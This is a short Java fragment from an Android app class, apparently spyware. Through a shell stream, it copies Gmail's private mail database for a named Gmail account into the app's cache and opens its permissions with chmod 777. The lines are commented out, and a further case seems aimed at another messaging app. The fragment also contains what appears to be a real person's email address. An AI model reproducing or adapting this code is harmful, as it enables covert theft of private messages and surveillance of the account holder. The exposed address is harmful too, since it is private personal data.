...
public class MA extends Activity {
	...
	public void CPdb(int key) throws Exception {
		...
		case 2:
			...
			/*os.write(("cp /data/data/com.google.android.gm/databases/mailstore."+"jennyrodriguezblanco"+"@gmail.com.db "
					+ getCacheDir() + "\n").getBytes());
			os.write(("chmod 777 " + getCacheDir() + "/mailstore."+"jennyrodriguezblanco"+"@gmail.com.db \n")
					.getBytes());*/
			break;
		case 3:
			// imo
